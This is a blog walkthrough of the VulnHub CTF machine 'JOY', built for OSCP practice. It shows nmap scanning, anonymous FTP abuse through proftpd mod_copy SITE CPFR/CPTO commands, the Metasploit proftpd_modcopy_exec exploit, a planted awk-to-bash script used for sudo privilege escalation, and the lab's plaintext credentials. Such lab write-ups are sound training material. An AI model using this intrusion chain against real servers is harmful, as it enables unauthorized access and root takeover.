<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Digitalworld.local: JOY Vulnhub Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/digitalworld-local-joy-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2019-07-24T04:58:22+00:00">July 24, 2019</time><time class="updated" datetime="2025-06-10T20:11:31+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today we have another CTF post, one more series of Dgitalworld.local named “joy” and the credits goes to Donavan. This is a boot to root challenge available on vulnhub you can download it from the given below link and the CTF is design for OSCP practices.</span></p>
<p><span style="color: #000000;">Download Link: <a style="color: #000000;" href="https://www.vulnhub.com/entry/digitalworldlocal-joy,298/">https://www.vulnhub.com/entry/digitalworldlocal-joy,298/</a></span></p>
<p><span style="color: #000000;"><strong>Level</strong>: Intermediate</span></p>
<p><span style="color: #000000;"><strong>Task</strong>: Obtain root shell</span></p>
<h3><span style="color: #800000;"><strong>Penetration Testing  Methodologies</strong></span></h3>
<p><span style="color: #000000;"><strong>Scanning</strong></span></p>
<ul>
<li><span style="color: #000000;">Nmap</span></li>
</ul>
<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
<ul>
<li><span style="color: #000000;">FTP anonymous login</span></li>
</ul>
<p><span style="color: #000000;"><strong>Exploit</strong></span></p>
<ul>
<li><span style="color: #000000;">Exploit proftpd using Metasploit</span></li>
</ul>
<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
<ul>
<li><span style="color: #000000;">Sudo right</span></li>
</ul>
<h3><span style="color: #800000;"><u>Walkthrough</u></span></h3>
<p><span style="color: #000000;"><strong>Scanning</strong></span></p>
<p><span style="color: #000000;">Let’s start off with the scanning process. This target VM took the IP address of 192.168.1.104 automatically from our local wifi network.</span></p>
<p><span style="color: #000000;">Then, as usual, we used our favourite tool Nmap for port scanning. Here we found that so many ports were opened but port 21 for ftp looks more interesting to me as anonymous login was allowed on the running machine for two directories /upload /download.</span></p>
<pre class="lang:default decode:true">nmap -A 192.168.1.104</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-o6ox0kZfUtU/XTfjS2ILq_I/AAAAAAAAfd0/2ApafVxOZiojSQ_PY8K3OaeW5U3p28bvwCLcBGAs/s1600/1.png"/></span></p>
<h3><span style="color: #800000;"><strong>Enumeration </strong></span></h3>
<p><span style="color: #000000;">So, we connect to ftp where here I find two directories /download and /upload. The upload directory has read and write permission whereas the /download has read permission.  So, we try to access /download directory and found a file within its named “directory”.</span></p>
<pre class="lang:default decode:true ">ftp 192.168.1.104
ls
cd download
ls
get directory</pre>
<p><span style="color: #000000;">Thus, we copied the file named as directories in our local machine.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-bzUlJfX54D8/XTfjTVZ3w2I/AAAAAAAAfd8/8fe9dU28tPMgRXBmCK9BKJxEzyBLVOcaQCLcBGAs/s1600/2.png"/></span></p>
<p><span style="color: #000000;">So, by reading directory file, you will evaluate that, this file gave a brief idea about Patrick’s directory where Patrick should be the user account. In this, we look at a file name “version_control”  it could be considered as a suspect. </span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-eZZrD8aKnAs/XTfjTWaTnmI/AAAAAAAAfeA/RIVm0jJWgT4GmNiN5qg5NGQQX2AteedlwCLcBGAs/s1600/3.png"/></span></p>
<p><span style="color: #000000;">Since the version_control exist inside Patrick’ s directory so we cannot grab the file directly, therefore, I try to transfer version_control file inside /upload directory because it has read/write permission through ftp anonymous login.</span></p>
<pre class="lang:default decode:true">telnet 192.168.1.104 21
site cpfr /home/patrick/version_control
site cpto /home/ftp/upload/version_control</pre>
<p><span style="color: #000000;">Hence you can observe with the help of above command we had copied “version_control” inside /upload folder.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-wv4EaeRrfPk/XTfjTxOYfQI/AAAAAAAAfeE/wXqkEQSUovYJktMBvX9NbLdn2x-20mD3QCLcBGAs/s1600/4.png"/></span></p>
<p><span style="color: #000000;">Further, we navigate to /upload/version_control and found a version of ftp service running on host machine moreover we obtained the path for webroot i.e. /var/www/tryingharderisjoy.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-dKTdHb7YfTQ/XTfjUK1KJwI/AAAAAAAAfeI/Pati5lpXrLwB5k4k52RL16Fbdk_Ap5IZACLcBGAs/s1600/5.png"/></span></p>
<h3><span style="color: #800000;">Exploit</span></h3>
<p><span style="color: #000000;">So, we search for an exploit for proftpd and found a Metasploit module thus we execute the following command to get a session of the host machine.</span></p>
<pre class="lang:default decode:true ">use exploit/unix/ftp/proftpd_modcopy_exec
msf exploit(unix/ftp/proftpd_modcopy_exec) &gt; set rhosts 192.168.1.104
msf exploit(unix/ftp/proftpd_modcopy_exec) &gt; set SITEPATH /var/www/tryingharderisjoy
msf exploit(unix/ftp/proftpd_modcopy_exec) &gt; exploit</pre>
<p><span style="color: #000000;">We successfully obtained the command shell of the remote machine, now it was time for post enumeration to step towards privilege escalation. Thus, we import python one-liner to access proper tty shell and start with directory traversing.</span></p>
<p><span style="color: #000000;">It feels good when we dig-out credential of Patrick from inside the /ossec/patricsecretofjoy.</span></p>
<p><span style="color: #000000;">credentials for JOY:</span></p>
<pre class="lang:default decode:true">patrick:apollo098765
root:howtheheckdoiknowwhattherootpasswordis</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-xwKwLH7lODY/XTfjU4g0eSI/AAAAAAAAfeU/S9LLeMv2T48BQLaMXP6QpeAkiFhc_tRwQCLcBGAs/s1600/6.png"/></span></p>
<h3><span style="color: #800000;">Privilege Escalation</span></h3>
<p><span style="color: #000000;">Without wasting time, we switch as Patrick and check for its sudo rights if assigned for him. Here we found that Patrick can run /home/patrick/script/test as sudo user. So, when we run the test script, it gave nothing useful as it was a demo to test working bash script thus the file “test” was useless but it own by root user which was doubtful for us.</span></p>
<p><span style="color: #000000;">So we decided to replace /test script with other malicious script but there was no writable permission on /script directory.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-uOIN-cxA13M/XTfjUxmvgkI/AAAAAAAAfeM/4URiYV4Mj50M0aNe5hrE6uePp2dV1lFAgCLcBGAs/s1600/7.png"/></span></p>
<p><span style="color: #000000;">Thus, again we decided to use FTP anonymous login for replacing genuine /test file with bogus /test file which will be a backdoor to provide higher privilege shell.</span></p>
<p><span style="color: #000000;">Therefore, we created a malicious file to get bash shell with the help of command given and named as “test” then try to upload it inside /upload directory since it was a writable folder.</span></p>
<pre class="lang:default decode:true">echo "awk 'BEGIN {system(\"/bin/bash\")}'" &gt; test</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-5TeJgk_Nb6w/XTfjU7vSHRI/AAAAAAAAfeQ/ysqL-N_0K-U_ZUrQjIM0tttPnk7sH8-kQCLcBGAs/s1600/8.png"/></span></p>
<p><span style="color: #000000;">Once again with the help of telnet let’s connect to ftp service running on the host machine and execute the following command to inject malicious script “test” inside /home/Patrick/script.</span></p>
<pre class="lang:default decode:true">telnet 192.168.1.104 21
site cpfr /home/ftp/upload/test
site cpto /home/patrick/script/test</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-pJnGdArhLe0/XTfjVt0G39I/AAAAAAAAfeY/Y7sbglge5uwDDpk7SgtB8bnN4jOjNZ51wCLcBGAs/s1600/9.png"/></span></p>
<p><span style="color: #000000;">So now we have injected the malicious file inside /script and user Patrick has sudo right to execute the /script/test as superuser. Now let’s escalate the privilege by execute following command and finish the task assigned by the author.</span></p>
<pre class="lang:default decode:true">sudo /home/patrick/script/test</pre>
<p><span style="color: #000000;">Hmmmmm!! so we have spawn root shell successfully, now let’s move inside /root directory and grab the proof.txt file and secret file.</span></p>
<pre class="lang:default decode:true">cd /root
cat proof.txt
author-secret.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-wT2V4fsuWQw/XTfjS_jcWBI/AAAAAAAAfd4/87KziAE5-1w2CmuI39vBSB5tEkKglSSpgCLcBGAs/s1600/10.png"/></span></p>
<p><span style="color: #000000;"><strong>Author: </strong>Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<strong><a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"> here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
